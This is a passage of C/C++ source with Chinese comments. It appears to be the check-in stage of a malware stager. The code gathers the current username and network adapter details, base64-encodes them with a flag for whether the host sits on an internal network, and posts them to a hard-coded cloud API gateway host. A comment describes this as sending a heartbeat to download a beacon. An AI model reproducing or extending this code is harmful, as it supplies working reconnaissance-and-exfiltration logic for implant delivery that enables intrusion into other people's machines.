            -1L, WINHTTP_ADDREQ_FLAG_ADD);

        // 发送请求
        if (bResults) {
            bResults = WinHttpSendRequest(hRequest,
                WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                (LPVOID)jsonData, jsonDataLength,
                jsonDataLength, 0);
        }
    }

    if (bResults) {
        // 接收响应
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    // 检查HTTP状态码
    if (bResults) {
        bResults = WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &dwStatusCode, &dwStatusSize, NULL);
        if (bResults && dwStatusCode == 200) {
            printf("Request succeeded with status code 200.\n");
        }
        else {
            printf("Request failed with status code %d.\n", dwStatusCode);
        }
    }
    else {
        printf("Request failed with error: %d\n", GetLastError());
    }
    // 清理资源
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}

int main()
{
    bool innr = httpURLsso();
    char* whoamiResult = GetWhoAmIResult();
    printf(whoamiResult);
    getchar();
    char* ipinfo = NULL;
    GetAdapterInfo(&ipinfo);
    unsigned char* baseStr = (unsigned char*)malloc(600 * sizeof(char)); //b64
    base64_encode((unsigned char*)ipinfo, strlen(ipinfo), baseStr);
    //int randomNumber = getRandomNumber(0, 10);

    unsigned char* baseStrName = (unsigned char*)malloc(150 * sizeof(char)); //bname64
    base64_encode((unsigned char*)whoamiResult, strlen(whoamiResult), baseStrName);
    //发送心跳包，下载beacon
    char* jsonData = (char*)malloc(5000 * sizeof(char));
    jsonData[0] = '\0';
    strcat(jsonData, "{\"b64\":\"");
    strcat(jsonData, (char*)baseStr);
    strcat(jsonData, "\",\n\"b64name\":\"");
    strcat(jsonData, (char*)baseStrName);
    if (innr) {
        strcat(jsonData, "\",\n\"inner\":");
        strcat(jsonData, "\"true\" }");
    }
    else {
        strcat(jsonData, "\",\n\"inner\":");
        strcat(jsonData, "\"false\"}");
    }
    const wchar_t* serverName = L"a83765fafeb94b66a14774cd23a75020.apig.cn-north-4.huaweicloudapis.com";
    const wchar_t* path = L"/RBCXgo";
    printf(jsonData);
    getchar();

    // 尝试HTTP请求
    //printf("Trying HTTP...\n");
    try {
        // 调用可能会抛出异常的函数
        SendRequest(serverName, path, (char*)jsonData, FALSE);
    }
    catch (const std::exception& e) {
        // 捕获并处理标准异常
        std::cerr << "Exception caught: " << e.what() << std::endl;
    }
    catch (...) {
        // 捕获所有其他类型的异常
        std::cerr << "Unknown exception caught!" << std::endl;
    }

    std::cout << "Program continues after exception handling." << std::endl;
    return 0;
    //SendRequest(serverName, path, (char*)jsonData, FALSE);
    //printf("11111111");
    //getchar();

    // 如果HTTP请求失败，尝试HTTPS请求
    if (GetLastError() != ERROR_SUCCESS) {
        printf("HTTP failed, trying HTTPS...\n");
        getchar();
        SendRequest(serverName, path, (char*)jsonData, TRUE);
    }

    getchar();
    //httpHuawei((char*)jsonData);
    //char* jsonData = "{\"name\":\"John Doe\",\"age\":30}";
    return 1;
}